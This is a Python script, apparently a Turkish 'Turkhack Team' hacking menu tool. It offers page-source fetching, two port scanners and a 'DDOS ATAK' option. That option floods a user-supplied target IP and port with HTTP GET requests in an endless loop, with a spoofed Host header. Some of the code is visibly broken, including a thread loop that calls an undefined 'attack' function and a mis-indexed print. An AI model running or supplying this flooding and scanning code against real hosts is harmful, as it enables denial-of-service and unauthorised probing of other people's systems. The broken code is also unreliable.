# coding=utf-8

import os
from bs4 import BeautifulSoup
import pyfiglet
import socket
import subprocess
import sys
from datetime import datetime
from socket import *
import platform
import re
import requests
from io import BytesIO
from datetime import date
from datetime import time
import random
import math
import datetime
import time
import ssl
import smtplib
from colorama import Fore, Back, Style
import requests as req







logo = """                                                                                                                                                                                                      
    '########:'##::::'##:'########::'##:::'##:'##::::'##::::'###:::::'######:: '##:::'##:
    ::: ##..:: ##:::: ##: ##.... ##: ##::'##:: ##:::: ##:::'## ##:::'##... ##: ##::'##::.
    ::: ##:::: ##:::: ##: ##:::: ##: ##:'##::: ##:::: ##::'##:. ##:: ##:::..:: ##:'##::::
    ::: ##:::: ##:::: ##: ########:: #####:::: #########:'##:::. ##: ##::::::: #####:::::
    ::: ##:::: ##:::: ##: ##.. ##::: ##. ##::: ##.... ##: #########: ##::::::: ##. ##::::
    ::: ##:::: ##:::: ##: ##::. ##:: ##:. ##:: ##:::: ##: ##.... ##: ##::: ## ##:. ##::::
    ::: ##::::. #######:: ##:::. ##: ##::. ##: ##:::: ##: ##:::: ##:. ######::##::. ##:::
    :::..::::::.......:::..:::::..::..::::..::..:::::..::..:::::..:::......:::..::::..:::                                                                                                                         
    ::::::::::::::::::::'########:'########::::'###::::'##::::'##::::::::::::::::::::::::
    ::::::::::::::::::::.. ##..:: ##.....::::'## ##::: ###::'###:::::::::::::::::::::::::
    :::::::::::::::::::::: ##:::: ##::::::::'##:. ##:: ####'####:::::::::::::::::::::::::
    :::::::::::::::::::::: ##:::: ######:::'##:::. ##: ## ### ##:::::::::::::::::::::::::
    :::::::::::::::::::::: ##:::: ##...:::: #########: ##. #: ##:::::::::::::::::::::::::
    ::::::::::::::::::::: ##:::: ##::::::: ##.... ##: ##:.:: ##: ::::::::::::::::::::::::                   
    ::::::::::::::::::::: ##:::: ########: ##:::: ##: ##:::: ##: ::::::::::::::::::::::::
    ::::::::::::::::::::::..:::::........::..:::::..::..:::::..::::::::::::::::::::::::::
           M.Kemal ATATÜRK     v1.1.0
           
"""   
print(Fore.RED + Style.BRIGHT + logo + Style.RESET_ALL + Style.BRIGHT +"\n") 
#print(logo)
while True:
    b="""                            
    #############################################################################################                                                                               
    # |----------------------------------------|     ##            ----KULLANIM----             #
    # | YAPİMCİ :  xyxALpHA                    |     ##                                         #
    # |----------------------------------------|     ## 1-)kaynak kod çek      2-)ağ port tara  #
    #                                                ##                                         #
    # |----------------------------------------|     ## 3-)sırayla port tara   4-)DDOS ATAK     #
    # | WEBSİTE : https://www.turkhackteam.org |     ##                                         # 
    # |----------------------------------------|     ##                                         #                                 
    #                                                ##      GUNCELLENEREK YENİ    ******       #
    # |----------------------------------------|     ##                ÖZELLİKLER               #
    # | TWİTTER :  xyxALpHA                    |     ##      ******          EKLENECEK          #
    # |----------------------------------------|     ## ________________________________________#
    #                                                ## son güncelleme: 12-05-2021    01:13     #
    #############################################################################################
    """
    #print(logo)
    print(b)

    import requests as req
    soru = input(">>>[+]İSLEM NUMARASI GİRİNİZ:")


    if soru == "1":

        import requests as req
 

        while True:
            import requests as req
            url = input(">>>[+]URL GİRİNİZ : ")
            print(">>{}".format(url))
            print("\n")
            aralik = int(input(">>>[+]CEKMEK İSTEDİGİNİZ SATIR SAYISI :"))
            print("{}".format(aralik))
            import requests as req
            r = req.get(url)
            yaz = r.text

            sor = input(">>>[+]BİLGİLERİ NE YAPMAK İSTERSİNİZ? [k]aydet / [s]il / [o]ku :")


            if sor == "k":
                dosya_adi = input(">>>[+]DOSYA İSMİ VE UZANTISI GİRİNİZ :")
                yenidosya = os.open(dosya_adi,os.O_RDWR|os.O_CREAT)
                os.write(yenidosya,yaz.encode())
                os.close(yenidosya)
                print("BİLGİLER {} DOSYASINA BASARIYLA KAYDEDİLDİ [SUCCESFULLY]".format(dosya_adi))
                okumak = input("DOSYAYI OKUMAK İSTERMİSİNİZ [e]/[h] :")

                if okumak == "e":

                    yenidosya = os.open(dosya_adi,os.O_RDONLY)
                    uzunluk = os.stat(yenidosya).st_size
                    icerik = os.read(yenidosya,uzunluk)
                    print(icerik.decode())

                else:
                    print("İSLEM BASARILI..")

            elif sor == "o":
                try:
                    print(yaz)[0:aralik]
                except:
                    pass
                finally:
                    print("{} WEB SİTESİNE AİT KAYNAK KODLARINI GORUYORSUNUZ".format(url))

            else:

                print("İŞLEM İPTAL EDİLDİ..")

            islem = input("BASKA İSLEM YAPMAK İSTER MİSİNİZ? [e]/[h] : ")

            if islem == "e":

                continue
            elif islem == "h":
                print("CIKIS BASARILI")
                break
    
                #dongu=input("BASKA İSLEM YAPMAK İSTER MİSİNİZ? [e]/[h] : ")



    elif soru == "2":
    
        import threading
        from queue import Queue    #AG PORT TARAMA
        import time
        import socket


        print_lock = threading.Lock()



        target = input(">>>[+]URL GİRİNİZ : https://")
        print("taranıyor...bekleyiniz...")
        #ip = socket.gethostbyname(target)




        def portscan(port):
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            try:
                con = s.connect((target,port))
                with print_lock:
                    print('ACIK PORT :',port)
                con.close()
            except:
                pass


        #çalışan işlemleri çeker ve işleme alır
        def threader():
            while True:
                # işlem sırasından bir işlem alır
                worker = q.get()

                # sıradaki işlem ile örnek işlem çalıştır
                portscan(worker)

                # işlem tamamlandı
                q.task_done()



        

        #sırayı ve işlemleri oluştur
        q = Queue()

        # izin verilen
        for x in range(30):
             t = threading.Thread(target=threader)

             #arka plan sınıflandırma
             t.daemon = True

             #----------------------------
             t.start()


        start = time.time()

        # 100 işlem
        for worker in range(1,100):
            q.put(worker)

        # işlemler bitene kadar bekleme
        q.join()
        

    elif soru == "3":

        import socket
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SIRAYLA PORTLARI TARA--KULLANICIYA BİLDİR
    

        target = input("[+] HEDEF IP ADRESİ: ")
        def scanner(port):
            try:
                sock.connect((target, port))
                return True
            except:
                return False

        for portNumber in range(1,100):
            print("PORT TARANIYOR", portNumber)
            if scanner(portNumber):
                print('[*] Port', portNumber, '/tcp','is open')
        


    elif soru == "4":


        import socket
        import threading

        target = input("HEDEF IP:")
        fake_ip = input("SAHTE IP:")   #ddos atak
        port = int(input("PORT:"))
    


        attack_num = 0
   
        while True:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((target, port))
            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
            s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
        
            attack_num += 1
            print("İSLEM BASARİLİ - ATAK NUMARASI {} : ",format(attack_num))
            s.close()


        for i in range(500):
            thread = threading.Thread(target=attack)
            thread.start()





    else:

        print("HATA : GECERLİ BİR SECİM YAPMADINIZ!!")

    dongu=input("BAŞKA BİR İŞLEM YAPMAK İSTİYOR MUSUNUZ? [e]/[h] : ")

    if dongu == "e":
        continue
    elif dongu == "h":
        break































